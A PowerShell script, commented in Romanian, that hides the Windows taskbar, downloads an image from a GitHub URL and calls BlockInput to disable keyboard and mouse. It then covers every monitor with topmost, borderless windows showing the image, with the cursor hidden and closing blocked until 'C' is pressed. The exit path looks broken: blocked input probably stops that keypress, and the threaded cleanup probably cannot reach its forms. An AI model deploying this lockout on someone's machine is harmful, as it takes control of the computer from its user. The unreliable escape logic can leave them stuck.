Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Cod pentru blocarea inputului
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class InputBlocker {
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
}
"@

# Cod pentru taskbar
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class TaskbarHider {
    [DllImport("user32.dll")]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@

# Ascunde Taskbar
$taskbar = [TaskbarHider]::FindWindow("Shell_TrayWnd", "")
[TaskbarHider]::ShowWindow($taskbar, 0)

# Descarcă imaginea dacă nu există
$tempImage = "$env:TEMP\poza_laptop.jpg"
if (-not (Test-Path $tempImage)) {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/diezul/x/main/1.jpg" -OutFile $tempImage
}

# Blochează inputul
[InputBlocker]::BlockInput($true)

# Variabilă globală de control
$script:inchide = $false
$forme = @()

# Funcție care deschide o fereastră pe un ecran
function DeschideFereastraPeMonitor {
    param($bounds)

    $form = New-Object Windows.Forms.Form
    $form.StartPosition = 'Manual'
    $form.Bounds = $bounds
    $form.FormBorderStyle = 'None'
    $form.TopMost = $true
    $form.BackColor = 'Black'
    $form.KeyPreview = $true
    $form.ShowInTaskbar = $false
    $form.Cursor = [System.Windows.Forms.Cursors]::None

    $pictureBox = New-Object Windows.Forms.PictureBox
    $pictureBox.ImageLocation = $tempImage
    $pictureBox.SizeMode = 'Zoom'
    $pictureBox.Dock = 'Fill'
    $form.Controls.Add($pictureBox)

    $form.Add_KeyDown({
        if ($_.KeyCode -eq 'C') {
            $script:inchide = $true
        }
    })

    $form.Add_FormClosing({
        if (-not $script:inchide) {
            $_.Cancel = $true
        }
    })

    $forme += $form
    [System.Windows.Forms.Application]::Run($form)
}

# Creăm câte un thread pentru fiecare ecran
foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
    $bounds = $screen.Bounds
    $scriptBlock = {
        param($b)
        DeschideFereastraPeMonitor -bounds $b
    }.GetNewClosure()

    $thread = New-Object System.Threading.Thread([Threading.ThreadStart]{
        $scriptBlock.Invoke($bounds)
    })
    $thread.SetApartmentState("STA")
    $thread.Start()
}

# Așteaptă până când tasta C este apăsată
while (-not $script:inchide) {
    Start-Sleep -Milliseconds 200
}

# Închide totul
foreach ($f in $forme) {
    try { $f.Invoke([Action]{ $f.Close() }) } catch {}
}
[TaskbarHider]::ShowWindow($taskbar, 1)
[InputBlocker]::BlockInput($false)
